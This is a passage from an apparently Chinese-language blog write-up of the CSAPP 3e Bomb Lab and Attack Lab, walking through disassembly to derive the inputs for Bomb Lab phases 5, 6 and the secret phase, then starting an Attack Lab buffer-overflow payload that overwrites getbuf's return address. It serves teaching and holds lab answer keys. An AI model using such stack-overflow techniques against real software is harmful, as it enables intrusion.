%edi,%ecx<br>0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;<br>0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx<br>0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;<br>0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax<br>0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;<br>0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax<br>0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx<br>0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;<br>0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi<br>0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;<br>0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax<br>0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp<br>0x000000000040100b &lt;+61&gt;:    ret<br></code></pre></td></tr></table></figure><p>要求func4的返回值为0，需要执行<code>0x400ff2</code>处的程序(%ecx&lt;&#x3D;%edi的分支)，该程序在%ecx&gt;&#x3D;%edi时返回0。因此需要%ecx与%edi相等。%ecx&#x3D;%rax+%rsi，之前%eax右移1位，即%ecx&#x3D;%eax&#x2F;2&#x3D;%edx&#x2F;2。%edi为输入的第一个数，取为7即可。</p><p>一个可行的输入为<strong>7 0</strong>。</p><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx<br>0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp<br>0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx<br>0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax<br>0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)<br>0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax<br>0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;<br>0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax<br>0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;<br>0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;<br>0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx<br>0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)<br>0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx<br>0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx<br>0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx<br>0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)<br>0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax<br>0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax<br>0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;<br>0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)<br>0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi<br>0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi<br>0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br>0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax<br>0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;<br>0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)<br>0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;<br>0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax<br>0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;<br>0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax<br>0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax<br>0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;<br>0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp<br>0x00000000004010f2 &lt;+144&gt;:   pop    %rbx<br>0x00000000004010f3 &lt;+145&gt;:   ret<br></code></pre></td></tr></table></figure><p>要求输入字符串的长度为6，然后对字符串进行处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and$0xf,%edx# 输入字符对16取余<br>movzbl0x4024b0(%rdx),%edx# 读取0x4024b0+%rdx处的字符<br>mov$dl,0x10(%rsp,%rax,1)# 保存处理完成的字符<br></code></pre></td></tr></table></figure><p>查看<code>0x4024b0</code>处的数据，取前16个字符为<code>maduiersnfoyvbyl</code>：</p><p><img src="/CSAPP3e_WP/image-20240125114931654-172450352160215.png" alt="image-20240125114931654" style="zoom: 67%;" align="left"></p><p>查看进行比较的字符串，位于<code>0x40245e</code>：</p><p><img src="/CSAPP3e_WP/image-20240125115105490-172450352338817.png" alt="image-20240125115105490" align="left" style="zoom:67%;"></p><p>因此应该选取<code>0x4024b0</code>处偏移量依次为9, 15, 14, 5, 6, 7处的字符。偏移量由输入字符的ASCII码对16取余得到，不妨取输入字符的ASCII码为0x69,0x6f,0x6d,0x65,0x66,0x67。</p><p>一个可行的输入为<strong>ionefg</strong>。</p><h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase 6"></a>Phase 6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r14<br>0x00000000004010f6 &lt;+2&gt;:     push   %r13<br>0x00000000004010f8 &lt;+4&gt;:     push   %r12<br>0x00000000004010fa &lt;+6&gt;:     push   %rbp<br>0x00000000004010fb &lt;+7&gt;:     push   %rbx<br>0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp<br>0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13<br>0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi<br>0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;<br>0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14<br>0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d<br>0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp<br>0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax<br>0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax<br>0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax<br>0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;<br>0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d<br>0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d<br>0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;<br>0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx<br>0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax<br>0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax<br>0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)<br>0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;<br>0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx<br>0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx<br>0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13<br>0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;<br><br>0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi<br>0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax<br>0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx<br>0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx<br>0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx<br>0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)<br>0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax<br>0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax<br>0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;<br>0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi<br>0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;<br><br>0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx<br>0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax<br>0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax<br>0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx<br>0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)<br>0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi<br>0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi<br>0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;<br>0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx<br>0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx<br>0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;<br>0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax<br>0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx<br>0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;<br><br>0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx<br>0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax<br>0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi<br>0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx<br>0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx<br>0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)<br>0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax<br>0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax<br>0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx<br>0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;<br>0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)<br>0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp<br>0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax<br>0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax<br>0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)<br>0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx<br>0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp<br>0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp<br>0x00000000004011fb &lt;+263&gt;:   pop    %rbx<br>0x00000000004011fc &lt;+264&gt;:   pop    %rbp<br>0x00000000004011fd &lt;+265&gt;:   pop    %r12<br>0x00000000004011ff &lt;+267&gt;:   pop    %r13<br>0x0000000000401201 &lt;+269&gt;:   pop    %r14<br>0x0000000000401203 &lt;+271&gt;:   ret<br></code></pre></td></tr></table></figure><p>输入为6个数字，循环跳出到<code>0x401153</code>。由<code>0x4a111b</code>, <code>0x4a111e</code>, <code>0x4a1121</code>处可知第一个数字不小于1且不大于6，将第一个数字存放于%eax。</p><p><code>0x401138</code>处开始处理剩下的数字，要求与第一个数字不相等。结合<code>0x401151</code>处的<code>jmp 0x401114</code>，每个数字的范围都在1至6之间，且两两不相等。输入结束后跳转到<code>0x401153</code>，此处将每个数字i变为7-i，全部转换结束后执行<code>0x40116f</code>处语句。</p><p>注意到内存地址<code>0x6032d0</code>，打印该处附近的值。</p><p><img src="/CSAPP3e_WP/image-20240125154321644-17245034799789.png" alt="image-20240125154321644" style="zoom: 67%;" align="left"></p><p>该处可能为链表：</p><table><thead><tr><th>node</th><th>data(BE)</th><th>next node</th></tr></thead><tbody><tr><td>node1</td><td>00 00 00 01 00 00 01 4c</td><td>node2</td></tr><tr><td>node2</td><td>00 00 00 02 00 00 00 a8</td><td>node3</td></tr><tr><td>node3</td><td>00 00 00 03 00 00 03 9c</td><td>node4</td></tr><tr><td>node4</td><td>00 00 00 04 00 00 02 b3</td><td>node5</td></tr><tr><td>node5</td><td>00 00 00 05 00 00 01 dd</td><td>node6</td></tr><tr><td>node6</td><td>00 00 00 06 00 00 01 bb</td><td>null</td></tr></tbody></table><p><code>0x4011a9</code>处的指令跳转回到<code>0x401176</code>，两行之间的指令对%edx, %rdx进行操作，%rsi循环累加并与0x18比较，此处循环结束后跳转到<code>0x4011ab</code>。向后定位到<code>0x4011e7</code>，要避免触发炸弹，需要%eax&#x3D;0x8(%rbx)&gt;&#x3D;(%rbx)，节点顺序7-i的排序满足各节点的数据递减，%eax取低32位，因此数据排序是3,4,5,6,1,2，输入序列是<strong>4 3 2 1 6 5</strong>。</p><h3 id="Secret-Phase"><a href="#Secret-Phase" class="headerlink" title="Secret Phase"></a>Secret Phase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx<br>0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;<br>0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx<br>0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi<br>0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi<br>0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;<br>0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx<br>0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax<br>0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax<br>0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;<br>0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi<br>0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi<br>0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;<br>0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax<br>0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;<br>0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi<br>0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;<br>0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;<br>0x0000000000401291 &lt;+79&gt;:    pop    %rbx<br>0x0000000000401292 &lt;+80&gt;:    ret<br></code></pre></td></tr></table></figure><p>观察Secret Phase的入口。之前各个Phase中均无入口，由<code>bomb.c</code>中代码可知，每个Phase之后都会执行一次phase_defused函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This phase will never be used, since no one will get past the</span><br><span class="hljs-comment"> * earlier ones.  But just in case, make this one extra hard. */</span><br>input = read_line();<br>phase_6(input);<br>phase_defused();<br></code></pre></td></tr></table></figure><p>找到该函数，发现需要的输入仍为6行，进入隐藏关卡的条件与<code>0x402622</code>处的数据有关，且此处输入一共有3个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp<br>0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax<br>0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)<br>0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax<br>0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;<br>0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;<br><br>0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r8<br>0x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx<br>0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx<br>0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi<br>0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi<br>0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax<br>0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;<br><br>0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi<br>0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi<br>0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br><br>0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax<br>0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;<br>0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi<br>0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;<br>0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi<br>0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;<br>0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax<br>0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;<br>0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi<br>0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;<br>0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax<br>0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax<br>0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;<br>0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp<br>0x0000000000401658 &lt;+148&gt;:   ret<br></code></pre></td></tr></table></figure><p>读取<code>0x402622</code>处的字符串：</p><p><img src="/CSAPP3e_WP/image-20240125163456712-17245034740287.png" alt="image-20240125163456712" style="zoom: 67%;" align="left"></p><p>注意到<code>0x402619</code>处的数据，可见字符串<code>&quot;DrEvil&quot;</code>是第3个输入：</p><p><img src="/CSAPP3e_WP/image-20240125163756124-17245034725135.png" alt="image-20240125163756124" style="zoom: 67%;" align="left"></p><p>在<code>0x4015fa</code>处（<code>sscanf</code>函数）打断点，从文件输入Phase 1~6的答案，观察<code>0x603870</code>处的数据：</p><p><img src="/CSAPP3e_WP/image-20240125171715694-17245034630081.png" alt="image-20240125171715694" style="zoom: 67%;" align="left"></p><p><code>&quot;DrEvil&quot;</code>输入应该位于 <code>&quot;7 0&quot;</code>之后。</p><p>要在<code>secret_phase</code>函数中避开炸弹，需要让调用的<code>fun7</code>函数返回2，传入参数%edi&#x3D;0x6030f0，查看该处附近的数据，发现若干具有两个指针的结构体：</p><p><img src="/CSAPP3e_WP/image-20240125175347829-17245034644793.png" alt="image-20240125175347829" style="zoom:67%;" align="left"></p><p>检查<code>fun7</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp<br>0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi<br>0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;<br>0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx<br>0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx<br>0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;<br>0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi<br>0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;<br>0x000000000040121c &lt;+24&gt;:    add    %eax,%eax<br>0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;<br>0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax<br>0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx<br>0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;<br>0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi<br>0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;<br>0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax<br>0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;<br>0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax<br>0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp<br>0x0000000000401241 &lt;+61&gt;:    ret<br></code></pre></td></tr></table></figure><p>递归调用逻辑为：将当前%rdi处的值%edx与%esi（由<code>secret_phase</code>函数知该值等于输入%ebx）比较，若%edx&gt;%esi，则%rdi自增0x8，并且%eax变为2*%eax；否则%rdi自增0x10，并且%eax变为2*%eax+1。</p><p>递归结束条件为：%rdi&#x3D;0(%eax&#x3D;0xffffffff)或%edx&#x3D;%esi，，此时返回值%eax&#x3D;0。</p><p>因此可以构造递归调用，由内向外%eax的值分别为0,1,2，%rdi总共自增0x18至<code>0x603270</code>，输入<code>0x14</code>即<strong>20</strong>。</p><h2 id="3-Attack-Lab-打开ROP的大门"><a href="#3-Attack-Lab-打开ROP的大门" class="headerlink" title="3. Attack Lab: 打开ROP的大门"></a>3. Attack Lab: 打开ROP的大门</h2><h3 id="Phase-1-1"><a href="#Phase-1-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>执行CTARGET，要求在getbuf返回时执行touch1而非test。</p><p>检查getbuf函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>0x00000000004017bd &lt;+21&gt;:    ret<br></code></pre></td></tr></table></figure><p><code>Gets</code>缓冲区大小为40个DWord，检查touch1函数，起始地址为<code>0x4017c0</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp<br># ... omitted<br>0x00000000004017e7 &lt;+39&gt;:    call   0x400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>因此只要在随意填满缓冲区后输入<code>c0 17 40 00 00 00 00 00</code>覆盖返回地址即可，构造输入序列：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span 